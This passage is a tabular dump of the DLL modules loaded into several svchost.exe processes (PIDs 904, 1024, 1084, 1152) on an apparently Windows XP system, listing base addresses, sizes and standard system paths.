904	svchost.exe	0x76390000	0x1d000	IMM32.DLL	C:\WINDOWS\system32\IMM32.DLL	N/A	Disabled
904	svchost.exe	0x629c0000	0x9000	LPK.DLL	C:\WINDOWS\system32\LPK.DLL	N/A	Disabled
904	svchost.exe	0x74d90000	0x6b000	USP10.dll	C:\WINDOWS\system32\USP10.dll	N/A	Disabled
904	svchost.exe	0x773d0000	0x103000	comctl32.dll	C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\comctl32.dll	N/A	Disabled
904	svchost.exe	0x5d090000	0x9a000	comctl32.dll	C:\WINDOWS\system32\comctl32.dll	N/A	Disabled
904	svchost.exe	0x76a80000	0x64000	rpcss.dll	c:\windows\system32\rpcss.dll	N/A	Disabled
904	svchost.exe	0x71ab0000	0x17000	WS2_32.dll	c:\windows\system32\WS2_32.dll	N/A	Disabled
904	svchost.exe	0x71aa0000	0x8000	WS2HELP.dll	c:\windows\system32\WS2HELP.dll	N/A	Disabled
904	svchost.exe	0x6e0000	0x2c5000	xpsp2res.dll	C:\WINDOWS\system32\xpsp2res.dll	N/A	Disabled
904	svchost.exe	0x59c00000	0x7000	credssp.dll	C:\WINDOWS\system32\credssp.dll	N/A	Disabled
904	svchost.exe	0x77a80000	0x97000	CRYPT32.dll	C:\WINDOWS\system32\CRYPT32.dll	N/A	Disabled
904	svchost.exe	0x77b20000	0x12000	MSASN1.dll	C:\WINDOWS\system32\MSASN1.dll	N/A	Disabled
904	svchost.exe	0x767f0000	0x29000	schannel.dll	C:\WINDOWS\system32\schannel.dll	N/A	Disabled
904	svchost.exe	0x5b860000	0x56000	NETAPI32.dll	C:\WINDOWS\system32\NETAPI32.dll	N/A	Disabled
904	svchost.exe	0x68000000	0x36000	rsaenh.dll	C:\WINDOWS\system32\rsaenh.dll	N/A	Disabled
904	svchost.exe	0x71a50000	0x3f000	mswsock.dll	C:\WINDOWS\system32\mswsock.dll	N/A	Disabled
904	svchost.exe	0x662b0000	0x58000	hnetcfg.dll	C:\WINDOWS\system32\hnetcfg.dll	N/A	Disabled
904	svchost.exe	0x71a90000	0x8000	wshtcpip.dll	C:\WINDOWS\System32\wshtcpip.dll	N/A	Disabled
904	svchost.exe	0x76f20000	0x27000	DNSAPI.dll	C:\WINDOWS\system32\DNSAPI.dll	N/A	Disabled
904	svchost.exe	0x76d60000	0x19000	iphlpapi.dll	C:\WINDOWS\system32\iphlpapi.dll	N/A	Disabled
904	svchost.exe	0x76fb0000	0x8000	winrnr.dll	C:\WINDOWS\System32\winrnr.dll	N/A	Disabled
904	svchost.exe	0x76f60000	0x2c000	WLDAP32.dll	C:\WINDOWS\system32\WLDAP32.dll	N/A	Disabled
904	svchost.exe	0x76fc0000	0x6000	rasadhlp.dll	C:\WINDOWS\system32\rasadhlp.dll	N/A	Disabled
904	svchost.exe	0x76fd0000	0x7f000	CLBCATQ.DLL	C:\WINDOWS\system32\CLBCATQ.DLL	N/A	Disabled
904	svchost.exe	0x77050000	0xc5000	COMRes.dll	C:\WINDOWS\system32\COMRes.dll	N/A	Disabled
1024	svchost.exe	0x1000000	0x6000	svchost.exe	C:\WINDOWS\System32\svchost.exe	N/A	Disabled
1024	svchost.exe	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
1024	svchost.exe	0x7c800000	0xf6000	kernel32.dll	C:\WINDOWS\system32\kernel32.dll	N/A	Disabled
1024	svchost.exe	0x77dd0000	0x9b000	ADVAPI32.dll	C:\WINDOWS\system32\ADVAPI32.dll	N/A	Disabled
1024	svchost.exe	0x77e70000	0x93000	RPCRT4.dll	C:\WINDOWS\system32\RPCRT4.dll	N/A	Disabled
1024	svchost.exe	0x77fe0000	0x11000	Secur32.dll	C:\WINDOWS\system32\Secur32.dll	N/A	Disabled
1024	svchost.exe	0x5cb70000	0x26000	ShimEng.dll	C:\WINDOWS\System32\ShimEng.dll	N/A	Disabled
1024	svchost.exe	0x6f880000	0x1ca000	AcGenral.DLL	C:\WINDOWS\AppPatch\AcGenral.DLL	N/A	Disabled
1024	svchost.exe	0x7e410000	0x91000	USER32.dll	C:\WINDOWS\system32\USER32.dll	N/A	Disabled
1024	svchost.exe	0x77f10000	0x49000	GDI32.dll	C:\WINDOWS\system32\GDI32.dll	N/A	Disabled
1024	svchost.exe	0x76b40000	0x2d000	WINMM.dll	C:\WINDOWS\System32\WINMM.dll	N/A	Disabled
1024	svchost.exe	0x774e0000	0x13e000	ole32.dll	C:\WINDOWS\system32\ole32.dll	N/A	Disabled
1024	svchost.exe	0x77c10000	0x58000	msvcrt.dll	C:\WINDOWS\system32\msvcrt.dll	N/A	Disabled
1024	svchost.exe	0x77120000	0x8b000	OLEAUT32.dll	C:\WINDOWS\system32\OLEAUT32.dll	N/A	Disabled
1024	svchost.exe	0x77be0000	0x15000	MSACM32.dll	C:\WINDOWS\System32\MSACM32.dll	N/A	Disabled
1024	svchost.exe	0x77c00000	0x8000	VERSION.dll	C:\WINDOWS\system32\VERSION.dll	N/A	Disabled
1024	svchost.exe	0x7c9c0000	0x818000	SHELL32.dll	C:\WINDOWS\system32\SHELL32.dll	N/A	Disabled
1024	svchost.exe	0x77f60000	0x76000	SHLWAPI.dll	C:\WINDOWS\system32\SHLWAPI.dll	N/A	Disabled
1024	svchost.exe	0x769c0000	0xb4000	USERENV.dll	C:\WINDOWS\system32\USERENV.dll	N/A	Disabled
1024	svchost.exe	0x5ad70000	0x38000	UxTheme.dll	C:\WINDOWS\System32\UxTheme.dll	N/A	Disabled
1024	svchost.exe	0x76390000	0x1d000	IMM32.DLL	C:\WINDOWS\system32\IMM32.DLL	N/A	Disabled
1024	svchost.exe	0x629c0000	0x9000	LPK.DLL	C:\WINDOWS\System32\LPK.DLL	N/A	Disabled
1024	svchost.exe	0x74d90000	0x6b000	USP10.dll	C:\WINDOWS\System32\USP10.dll	N/A	Disabled
1024	svchost.exe	0x773d0000	0x103000	comctl32.dll	C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\comctl32.dll	N/A	Disabled
1024	svchost.exe	0x5d090000	0x9a000	comctl32.dll	C:\WINDOWS\system32\comctl32.dll	N/A	Disabled
1024	svchost.exe	0x77690000	0x21000	NTMARTA.DLL	C:\WINDOWS\System32\NTMARTA.DLL	N/A	Disabled
1024	svchost.exe	0x71bf0000	0x13000	SAMLIB.dll	C:\WINDOWS\System32\SAMLIB.dll	N/A	Disabled
1024	svchost.exe	0x76f60000	0x2c000	WLDAP32.dll	C:\WINDOWS\system32\WLDAP32.dll	N/A	Disabled
1024	svchost.exe	0x6e0000	0x2c5000	xpsp2res.dll	C:\WINDOWS\System32\xpsp2res.dll	N/A	Disabled
1024	svchost.exe	0x776e0000	0x23000	shsvcs.dll	c:\windows\system32\shsvcs.dll	N/A	Disabled
1024	svchost.exe	0x76360000	0x10000	WINSTA.dll	C:\WINDOWS\System32\WINSTA.dll	N/A	Disabled
1024	svchost.exe	0x5b860000	0x56000	NETAPI32.dll	C:\WINDOWS\System32\NETAPI32.dll	N/A	Disabled
1024	svchost.exe	0x7d4b0000	0x22000	dhcpcsvc.dll	c:\windows\system32\dhcpcsvc.dll	N/A	Disabled
1024	svchost.exe	0x76f20000	0x27000	DNSAPI.dll	c:\windows\system32\DNSAPI.dll	N/A	Disabled
1024	svchost.exe	0x71ab0000	0x17000	WS2_32.dll	c:\windows\system32\WS2_32.dll	N/A	Disabled
1024	svchost.exe	0x71aa0000	0x8000	WS2HELP.dll	c:\windows\system32\WS2HELP.dll	N/A	Disabled
1024	svchost.exe	0x76d60000	0x19000	iphlpapi.dll	c:\windows\system32\iphlpapi.dll	N/A	Disabled
1024	svchost.exe	0x68000000	0x36000	rsaenh.dll	C:\WINDOWS\System32\rsaenh.dll	N/A	Disabled
1024	svchost.exe	0x59c00000	0x7000	credssp.dll	C:\WINDOWS\System32\credssp.dll	N/A	Disabled
1024	svchost.exe	0x77a80000	0x97000	CRYPT32.dll	C:\WINDOWS\System32\CRYPT32.dll	N/A	Disabled
1024	svchost.exe	0x77b20000	0x12000	MSASN1.dll	C:\WINDOWS\System32\MSASN1.dll	N/A	Disabled
1024	svchost.exe	0x767f0000	0x29000	schannel.dll	C:\WINDOWS\system32\schannel.dll	N/A	Disabled
1024	svchost.exe	0x7db10000	0x8c000	wzcsvc.dll	c:\windows\system32\wzcsvc.dll	N/A	Disabled
1024	svchost.exe	0x76e80000	0xe000	rtutils.dll	c:\windows\system32\rtutils.dll	N/A	Disabled
1024	svchost.exe	0x76d30000	0x4000	WMI.dll	c:\windows\system32\WMI.dll	N/A	Disabled
1024	svchost.exe	0x72810000	0xb000	EapolQec.dll	c:\windows\system32\EapolQec.dll	N/A	Disabled
1024	svchost.exe	0x76b20000	0x11000	ATL.DLL	c:\windows\system32\ATL.DLL	N/A	Disabled
1024	svchost.exe	0x726c0000	0x16000	QUtil.dll	c:\windows\system32\QUtil.dll	N/A	Disabled
1024	svchost.exe	0x76080000	0x65000	MSVCP60.dll	c:\windows\system32\MSVCP60.dll	N/A	Disabled
1024	svchost.exe	0x478c0000	0xa000	dot3api.dll	c:\windows\system32\dot3api.dll	N/A	Disabled
1024	svchost.exe	0x76f50000	0x8000	WTSAPI32.dll	c:\windows\system32\WTSAPI32.dll	N/A	Disabled
1024	svchost.exe	0x606b0000	0x10d000	ESENT.dll	c:\windows\system32\ESENT.dll	N/A	Disabled
1024	svchost.exe	0x76fd0000	0x7f000	CLBCATQ.DLL	C:\WINDOWS\System32\CLBCATQ.DLL	N/A	Disabled
1024	svchost.exe	0x77050000	0xc5000	COMRes.dll	C:\WINDOWS\System32\COMRes.dll	N/A	Disabled
1024	svchost.exe	0x76b70000	0x28000	rastls.dll	C:\WINDOWS\System32\rastls.dll	N/A	Disabled
1024	svchost.exe	0x754d0000	0x80000	CRYPTUI.dll	C:\WINDOWS\System32\CRYPTUI.dll	N/A	Disabled
1024	svchost.exe	0x3d930000	0xe7000	WININET.dll	C:\WINDOWS\system32\WININET.dll	N/A	Disabled
1024	svchost.exe	0x1460000	0x9000	Normaliz.dll	C:\WINDOWS\system32\Normaliz.dll	N/A	Disabled
1024	svchost.exe	0x78130000	0x134000	urlmon.dll	C:\WINDOWS\system32\urlmon.dll	N/A	Disabled
1024	svchost.exe	0x3dfd0000	0x1ec000	iertutil.dll	C:\WINDOWS\system32\iertutil.dll	N/A	Disabled
1024	svchost.exe	0x76c30000	0x2e000	WINTRUST.dll	C:\WINDOWS\System32\WINTRUST.dll	N/A	Disabled
1024	svchost.exe	0x76c90000	0x28000	IMAGEHLP.dll	C:\WINDOWS\system32\IMAGEHLP.dll	N/A	Disabled
1024	svchost.exe	0x76d40000	0x18000	MPRAPI.dll	C:\WINDOWS\System32\MPRAPI.dll	N/A	Disabled
1024	svchost.exe	0x77cc0000	0x32000	ACTIVEDS.dll	C:\WINDOWS\System32\ACTIVEDS.dll	N/A	Disabled
1024	svchost.exe	0x76e10000	0x25000	adsldpc.dll	C:\WINDOWS\System32\adsldpc.dll	N/A	Disabled
1024	svchost.exe	0x77920000	0xf3000	SETUPAPI.dll	C:\WINDOWS\System32\SETUPAPI.dll	N/A	Disabled
1024	svchost.exe	0x76ee0000	0x3c000	RASAPI32.dll	C:\WINDOWS\System32\RASAPI32.dll	N/A	Disabled
1024	svchost.exe	0x76e90000	0x12000	rasman.dll	C:\WINDOWS\System32\rasman.dll	N/A	Disabled
1024	svchost.exe	0x76eb0000	0x2f000	TAPI32.dll	C:\WINDOWS\System32\TAPI32.dll	N/A	Disabled
1024	svchost.exe	0x723d0000	0x1c000	WinSCard.dll	C:\WINDOWS\System32\WinSCard.dll	N/A	Disabled
1024	svchost.exe	0x76bf0000	0xb000	PSAPI.DLL	C:\WINDOWS\System32\PSAPI.DLL	N/A	Disabled
1024	svchost.exe	0x76bd0000	0x16000	raschap.dll	C:\WINDOWS\System32\raschap.dll	N/A	Disabled
1024	svchost.exe	0x77c70000	0x25000	msv1_0.dll	C:\WINDOWS\system32\msv1_0.dll	N/A	Disabled
1024	svchost.exe	0x76790000	0xc000	cryptdll.dll	C:\WINDOWS\System32\cryptdll.dll	N/A	Disabled
1024	svchost.exe	0x59490000	0x28000	wmisvc.dll	c:\windows\system32\wbem\wmisvc.dll	N/A	Disabled
1024	svchost.exe	0x753e0000	0x6d000	VSSAPI.DLL	C:\WINDOWS\system32\VSSAPI.DLL	N/A	Disabled
1024	svchost.exe	0x77d00000	0x33000	netman.dll	c:\windows\system32\netman.dll	N/A	Disabled
1024	svchost.exe	0x76400000	0x1a5000	netshell.dll	c:\windows\system32\netshell.dll	N/A	Disabled
1024	svchost.exe	0x76c00000	0x2e000	credui.dll	c:\windows\system32\credui.dll	N/A	Disabled
1024	svchost.exe	0x736d0000	0x6000	dot3dlg.dll	c:\windows\system32\dot3dlg.dll	N/A	Disabled
1024	svchost.exe	0x5dca0000	0x28000	OneX.DLL	c:\windows\system32\OneX.DLL	N/A	Disabled
1024	svchost.exe	0x745b0000	0x22000	eappcfg.dll	c:\windows\system32\eappcfg.dll	N/A	Disabled
1024	svchost.exe	0x5dcd0000	0xe000	eappprxy.dll	c:\windows\system32\eappprxy.dll	N/A	Disabled
1024	svchost.exe	0x73030000	0x10000	WZCSAPI.DLL	c:\windows\system32\WZCSAPI.DLL	N/A	Disabled
1024	svchost.exe	0x77710000	0x44000	es.dll	C:\WINDOWS\system32\es.dll	N/A	Disabled
1024	svchost.exe	0x66460000	0x55000	ipnathlp.dll	c:\windows\system32\ipnathlp.dll	N/A	Disabled
1024	svchost.exe	0x71a50000	0x3f000	MSWSOCK.dll	c:\windows\system32\MSWSOCK.dll	N/A	Disabled
1024	svchost.exe	0x776c0000	0x12000	AUTHZ.dll	c:\windows\system32\AUTHZ.dll	N/A	Disabled
1024	svchost.exe	0x662b0000	0x58000	hnetcfg.dll	C:\WINDOWS\System32\hnetcfg.dll	N/A	Disabled
1024	svchost.exe	0x71a90000	0x8000	wshtcpip.dll	C:\WINDOWS\System32\wshtcpip.dll	N/A	Disabled
1024	svchost.exe	0x77300000	0x33000	schedsvc.dll	c:\windows\system32\schedsvc.dll	N/A	Disabled
1024	svchost.exe	0x767a0000	0x14000	NTDSAPI.dll	c:\windows\system32\NTDSAPI.dll	N/A	Disabled
1024	svchost.exe	0x74f50000	0x5000	MSIDLE.DLL	C:\WINDOWS\System32\MSIDLE.DLL	N/A	Disabled
1024	svchost.exe	0x708b0000	0xd000	audiosrv.dll	c:\windows\system32\audiosrv.dll	N/A	Disabled
1024	svchost.exe	0x76e40000	0x24000	wkssvc.dll	c:\windows\system32\wkssvc.dll	N/A	Disabled
1024	svchost.exe	0x76de0000	0x24000	upnp.dll	C:\WINDOWS\system32\upnp.dll	N/A	Disabled
1024	svchost.exe	0x4d4f0000	0x59000	WINHTTP.dll	C:\WINDOWS\system32\WINHTTP.dll	N/A	Disabled
1024	svchost.exe	0x74f00000	0xc000	SSDPAPI.dll	C:\WINDOWS\system32\SSDPAPI.dll	N/A	Disabled
1024	svchost.exe	0x75290000	0x37000	wbemcomn.dll	C:\WINDOWS\system32\wbem\wbemcomn.dll	N/A	Disabled
1024	svchost.exe	0x762c0000	0x85000	wbemcore.dll	C:\WINDOWS\System32\Wbem\wbemcore.dll	N/A	Disabled
1024	svchost.exe	0x75310000	0x3f000	esscli.dll	C:\WINDOWS\System32\Wbem\esscli.dll	N/A	Disabled
1024	svchost.exe	0x75690000	0x76000	FastProx.dll	C:\WINDOWS\System32\Wbem\FastProx.dll	N/A	Disabled
1024	svchost.exe	0x74ed0000	0xe000	wbemsvc.dll	C:\WINDOWS\system32\wbem\wbemsvc.dll	N/A	Disabled
1024	svchost.exe	0x75020000	0x1b000	wmiutils.dll	C:\WINDOWS\system32\wbem\wmiutils.dll	N/A	Disabled
1024	svchost.exe	0x75200000	0x2f000	repdrvfs.dll	C:\WINDOWS\system32\wbem\repdrvfs.dll	N/A	Disabled
1024	svchost.exe	0x3f1e0000	0x72000	wmiprvsd.dll	C:\WINDOWS\system32\wbem\wmiprvsd.dll	N/A	Disabled
1024	svchost.exe	0x5f770000	0xc000	NCObjAPI.DLL	C:\WINDOWS\system32\NCObjAPI.DLL	N/A	Disabled
1024	svchost.exe	0x75390000	0x46000	wbemess.dll	C:\WINDOWS\system32\wbem\wbemess.dll	N/A	Disabled
1024	svchost.exe	0x755f0000	0x9a000	netcfgx.dll	C:\WINDOWS\system32\netcfgx.dll	N/A	Disabled
1024	svchost.exe	0x76d10000	0x12000	CLUSAPI.dll	C:\WINDOWS\system32\CLUSAPI.dll	N/A	Disabled
1024	svchost.exe	0x76ce0000	0x12000	cryptsvc.dll	c:\windows\system32\cryptsvc.dll	N/A	Disabled
1024	svchost.exe	0x77b90000	0x32000	certcli.dll	c:\windows\system32\certcli.dll	N/A	Disabled
1024	svchost.exe	0x74f90000	0x9000	dmserver.dll	c:\windows\system32\dmserver.dll	N/A	Disabled
1024	svchost.exe	0x74f80000	0x9000	ersvc.dll	c:\windows\system32\ersvc.dll	N/A	Disabled
1024	svchost.exe	0x74f40000	0xc000	pchsvc.dll	c:\windows\pchealth\helpctr\binaries\pchsvc.dll	N/A	Disabled
1024	svchost.exe	0x75090000	0x1b000	srvsvc.dll	c:\windows\system32\srvsvc.dll	N/A	Disabled
1024	svchost.exe	0x73d20000	0x8000	seclogon.dll	c:\windows\system32\seclogon.dll	N/A	Disabled
1024	svchost.exe	0x722d0000	0xd000	sens.dll	c:\windows\system32\sens.dll	N/A	Disabled
1024	svchost.exe	0x751a0000	0x2e000	srsvc.dll	c:\windows\system32\srsvc.dll	N/A	Disabled
1024	svchost.exe	0x74ad0000	0x8000	POWRPROF.dll	c:\windows\system32\POWRPROF.dll	N/A	Disabled
1024	svchost.exe	0x75070000	0x19000	trkwks.dll	c:\windows\system32\trkwks.dll	N/A	Disabled
1024	svchost.exe	0x767c0000	0x2d000	w32time.dll	c:\windows\system32\w32time.dll	N/A	Disabled
1024	svchost.exe	0x4c0a0000	0x17000	wscsvc.dll	c:\windows\system32\wscsvc.dll	N/A	Disabled
1024	svchost.exe	0x3fde0000	0x440000	msi.dll	c:\windows\system32\msi.dll	N/A	Disabled
1024	svchost.exe	0x50000000	0x7000	wuauserv.dll	c:\windows\system32\wuauserv.dll	N/A	Disabled
1024	svchost.exe	0x50040000	0x1da000	wuaueng.dll	C:\WINDOWS\system32\wuaueng.dll	N/A	Disabled
1024	svchost.exe	0x73000000	0x26000	WINSPOOL.DRV	C:\WINDOWS\System32\WINSPOOL.DRV	N/A	Disabled
1024	svchost.exe	0x75150000	0x13000	Cabinet.dll	C:\WINDOWS\System32\Cabinet.dll	N/A	Disabled
1024	svchost.exe	0x600a0000	0xb000	mspatcha.dll	C:\WINDOWS\System32\mspatcha.dll	N/A	Disabled
1024	svchost.exe	0x76da0000	0x16000	browser.dll	c:\windows\system32\browser.dll	N/A	Disabled
1024	svchost.exe	0x76bb0000	0x5000	sfc.dll	C:\WINDOWS\System32\sfc.dll	N/A	Disabled
1024	svchost.exe	0x76c60000	0x2a000	sfc_os.dll	C:\WINDOWS\System32\sfc_os.dll	N/A	Disabled
1024	svchost.exe	0x77b40000	0x22000	Apphelp.dll	C:\WINDOWS\system32\Apphelp.dll	N/A	Disabled
1024	svchost.exe	0x5f740000	0xe000	ncprov.dll	C:\WINDOWS\system32\wbem\ncprov.dll	N/A	Disabled
1024	svchost.exe	0x76fb0000	0x8000	winrnr.dll	C:\WINDOWS\System32\winrnr.dll	N/A	Disabled
1024	svchost.exe	0x76fc0000	0x6000	rasadhlp.dll	C:\WINDOWS\System32\rasadhlp.dll	N/A	Disabled
1024	svchost.exe	0x50f00000	0xd000	wups2.dll	C:\WINDOWS\system32\wups2.dll	N/A	Disabled
1024	svchost.exe	0x7e720000	0xb0000	SXS.DLL	C:\WINDOWS\System32\SXS.DLL	N/A	Disabled
1024	svchost.exe	0x76620000	0x13c000	comsvcs.dll	C:\WINDOWS\system32\comsvcs.dll	N/A	Disabled
1024	svchost.exe	0x75130000	0x14000	colbact.DLL	C:\WINDOWS\system32\colbact.DLL	N/A	Disabled
1024	svchost.exe	0x750f0000	0x13000	MTXCLU.DLL	C:\WINDOWS\system32\MTXCLU.DLL	N/A	Disabled
1024	svchost.exe	0x71ad0000	0x9000	WSOCK32.dll	C:\WINDOWS\system32\WSOCK32.dll	N/A	Disabled
1024	svchost.exe	0x750b0000	0x12000	RESUTILS.DLL	C:\WINDOWS\System32\RESUTILS.DLL	N/A	Disabled
1024	svchost.exe	0x733e0000	0x40000	tapisrv.dll	c:\windows\system32\tapisrv.dll	N/A	Disabled
1024	svchost.exe	0x7df30000	0x32000	rasmans.dll	c:\windows\system32\rasmans.dll	N/A	Disabled
1024	svchost.exe	0x74370000	0xb000	WINIPSEC.DLL	c:\windows\system32\WINIPSEC.DLL	N/A	Disabled
1024	svchost.exe	0x75880000	0x11000	rastapi.dll	C:\WINDOWS\System32\rastapi.dll	N/A	Disabled
1024	svchost.exe	0x57cc0000	0x36000	unimdm.tsp	C:\WINDOWS\System32\unimdm.tsp	N/A	Disabled
1024	svchost.exe	0x72000000	0x7000	uniplat.dll	C:\WINDOWS\System32\uniplat.dll	N/A	Disabled
1024	svchost.exe	0x768d0000	0xa4000	RASDLG.dll	C:\WINDOWS\System32\RASDLG.dll	N/A	Disabled
1024	svchost.exe	0x57d40000	0xb000	kmddsp.tsp	C:\WINDOWS\System32\kmddsp.tsp	N/A	Disabled
1024	svchost.exe	0x57d20000	0x10000	ndptsp.tsp	C:\WINDOWS\System32\ndptsp.tsp	N/A	Disabled
1024	svchost.exe	0x57d50000	0x8000	ipconf.tsp	C:\WINDOWS\System32\ipconf.tsp	N/A	Disabled
1024	svchost.exe	0x57d70000	0x46000	h323.tsp	C:\WINDOWS\System32\h323.tsp	N/A	Disabled
1024	svchost.exe	0x57d60000	0xa000	hidphone.tsp	C:\WINDOWS\System32\hidphone.tsp	N/A	Disabled
1024	svchost.exe	0x688f0000	0x9000	HID.DLL	C:\WINDOWS\System32\HID.DLL	N/A	Disabled
1024	svchost.exe	0x72240000	0x37000	rasppp.dll	C:\WINDOWS\System32\rasppp.dll	N/A	Disabled
1024	svchost.exe	0x724b0000	0x6000	ntlsapi.dll	C:\WINDOWS\System32\ntlsapi.dll	N/A	Disabled
1024	svchost.exe	0x71cf0000	0x4c000	kerberos.dll	C:\WINDOWS\system32\kerberos.dll	N/A	Disabled
1024	svchost.exe	0x72ae0000	0x13000	RASQEC.DLL	C:\WINDOWS\System32\RASQEC.DLL	N/A	Disabled
1084	svchost.exe	0x1000000	0x6000	svchost.exe	C:\WINDOWS\system32\svchost.exe	N/A	Disabled
1084	svchost.exe	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
1084	svchost.exe	0x7c800000	0xf6000	kernel32.dll	C:\WINDOWS\system32\kernel32.dll	N/A	Disabled
1084	svchost.exe	0x77dd0000	0x9b000	ADVAPI32.dll	C:\WINDOWS\system32\ADVAPI32.dll	N/A	Disabled
1084	svchost.exe	0x77e70000	0x93000	RPCRT4.dll	C:\WINDOWS\system32\RPCRT4.dll	N/A	Disabled
1084	svchost.exe	0x77fe0000	0x11000	Secur32.dll	C:\WINDOWS\system32\Secur32.dll	N/A	Disabled
1084	svchost.exe	0x5cb70000	0x26000	ShimEng.dll	C:\WINDOWS\system32\ShimEng.dll	N/A	Disabled
1084	svchost.exe	0x6f880000	0x1ca000	AcGenral.DLL	C:\WINDOWS\AppPatch\AcGenral.DLL	N/A	Disabled
1084	svchost.exe	0x7e410000	0x91000	USER32.dll	C:\WINDOWS\system32\USER32.dll	N/A	Disabled
1084	svchost.exe	0x77f10000	0x49000	GDI32.dll	C:\WINDOWS\system32\GDI32.dll	N/A	Disabled
1084	svchost.exe	0x76b40000	0x2d000	WINMM.dll	C:\WINDOWS\system32\WINMM.dll	N/A	Disabled
1084	svchost.exe	0x774e0000	0x13e000	ole32.dll	C:\WINDOWS\system32\ole32.dll	N/A	Disabled
1084	svchost.exe	0x77c10000	0x58000	msvcrt.dll	C:\WINDOWS\system32\msvcrt.dll	N/A	Disabled
1084	svchost.exe	0x77120000	0x8b000	OLEAUT32.dll	C:\WINDOWS\system32\OLEAUT32.dll	N/A	Disabled
1084	svchost.exe	0x77be0000	0x15000	MSACM32.dll	C:\WINDOWS\system32\MSACM32.dll	N/A	Disabled
1084	svchost.exe	0x77c00000	0x8000	VERSION.dll	C:\WINDOWS\system32\VERSION.dll	N/A	Disabled
1084	svchost.exe	0x7c9c0000	0x818000	SHELL32.dll	C:\WINDOWS\system32\SHELL32.dll	N/A	Disabled
1084	svchost.exe	0x77f60000	0x76000	SHLWAPI.dll	C:\WINDOWS\system32\SHLWAPI.dll	N/A	Disabled
1084	svchost.exe	0x769c0000	0xb4000	USERENV.dll	C:\WINDOWS\system32\USERENV.dll	N/A	Disabled
1084	svchost.exe	0x5ad70000	0x38000	UxTheme.dll	C:\WINDOWS\system32\UxTheme.dll	N/A	Disabled
1084	svchost.exe	0x76390000	0x1d000	IMM32.DLL	C:\WINDOWS\system32\IMM32.DLL	N/A	Disabled
1084	svchost.exe	0x629c0000	0x9000	LPK.DLL	C:\WINDOWS\system32\LPK.DLL	N/A	Disabled
1084	svchost.exe	0x74d90000	0x6b000	USP10.dll	C:\WINDOWS\system32\USP10.dll	N/A	Disabled
1084	svchost.exe	0x773d0000	0x103000	comctl32.dll	C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\comctl32.dll	N/A	Disabled
1084	svchost.exe	0x5d090000	0x9a000	comctl32.dll	C:\WINDOWS\system32\comctl32.dll	N/A	Disabled
1084	svchost.exe	0x76770000	0xd000	dnsrslvr.dll	c:\windows\system32\dnsrslvr.dll	N/A	Disabled
1084	svchost.exe	0x76f20000	0x27000	DNSAPI.dll	c:\windows\system32\DNSAPI.dll	N/A	Disabled
1084	svchost.exe	0x71ab0000	0x17000	WS2_32.dll	c:\windows\system32\WS2_32.dll	N/A	Disabled
1084	svchost.exe	0x71aa0000	0x8000	WS2HELP.dll	c:\windows\system32\WS2HELP.dll	N/A	Disabled
1084	svchost.exe	0x76d60000	0x19000	iphlpapi.dll	c:\windows\system32\iphlpapi.dll	N/A	Disabled
1084	svchost.exe	0x68000000	0x36000	rsaenh.dll	C:\WINDOWS\system32\rsaenh.dll	N/A	Disabled
1084	svchost.exe	0x71a50000	0x3f000	mswsock.dll	C:\WINDOWS\system32\mswsock.dll	N/A	Disabled
1084	svchost.exe	0x662b0000	0x58000	hnetcfg.dll	C:\WINDOWS\system32\hnetcfg.dll	N/A	Disabled
1084	svchost.exe	0x71a90000	0x8000	wshtcpip.dll	C:\WINDOWS\System32\wshtcpip.dll	N/A	Disabled
1152	svchost.exe	0x1000000	0x6000	svchost.exe	C:\WINDOWS\system32\svchost.exe	N/A	Disabled
1152	svchost.exe	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
1152	svchost.exe	0x7c800000	0xf6000	kernel32.dll	C:\WINDOWS\system32\kernel32.dll	N/A	Disabled
1152	svchost.exe	0x77dd0000	0x9b000	ADVAPI32.dll	C:\WINDOWS\system32\ADVAPI32.dll	N/A	Disabled
1152	svchost.exe	0x77e70000	0x93000	RPCRT4.dll	C:\WINDOWS\system32\RPCRT4.dll	N/A	Disabled
1152	svchost.exe	0x77fe0000	0x11000	Secur32.dll	C:\WINDOWS\system32\Secur32.dll	N/A	Disabled
1152	svchost.exe	0x5cb70000	0x26000	ShimEng.dll	C:\WINDOWS\system32\ShimEng.dll	N/A	Disabled
1152	svchost.exe	0x6f880000	0x1ca000	AcGenral.DLL	C:\WINDOWS\AppPatch\AcGenral.DLL	N/A	Disabled
1152	svchost.exe	0x7e410000	0x91000	USER32.dll	C:\WINDOWS\system32\USER32.dll	N/A	Disabled
1152	svchost.exe	0x77f10000	0x49000	GDI32.dll	C:\WINDOWS\system32\GDI32.dll	N/A	Disabled
1152	svchost.exe	0x76b40000	0x2d000	WINMM.dll	C:\WINDOWS\system32\WINMM.dll	N/A	Disabled
1152	svchost.exe	0x774e0000	0x13e000	ole32.dll	C:\WINDOWS\system32\ole32.dll	N/A	Disabled
1152	svchost.exe	0x77c10000	0x58000	msvcrt.dll	C:\WINDOWS\system32\msvcrt.dll	N/A	Disabled
1152	svchost.exe	0x77120000	0x8b000	OLEAUT32.dll	C:\WINDOWS\system32\OLEAUT32.dll	N/A	Disabled
1152	svchost.exe	0x77be0000	0x15000	MSACM32.dll	C:\WINDOWS\system32\MSACM32.dll	N/A	Disabled
1152	svchost.exe	0x77c00000	0x8000	VERSION.dll	C:\WINDOWS\system32\VERSION.dll	N/A	Disabled
1152	svchost.exe	0x7c9c0000	0x818000	SHELL32.dll	C:\WINDOWS\system32\SHELL32.dll	N/A	Disabled
1152	svchost.exe	0x77f60000	0x76000	SHLWAPI.dll	C:\WINDOWS\system32\SHLWAPI.dll	N/A	Disabled
1152	svchost.exe	0x769c0000	0xb4000	USERENV.dll	C:\WINDOWS\system32\USERENV.dll	N/A	Disabled
1152	svchost.exe	0x5ad70000	0x38000	UxTheme.dll	C:\WINDOWS\system32\UxTheme.dll	N/A	Disabled
1152	svchost.exe	0x76390000	0x1d000	IMM32.DLL	C:\WINDOWS\system32\IMM32.DLL	N/A	Disabled
1152	svchost.exe	0x629c0000	0x9000	LPK.DLL	C:\WINDOWS\system32\LPK.DLL	N/A	Disabled
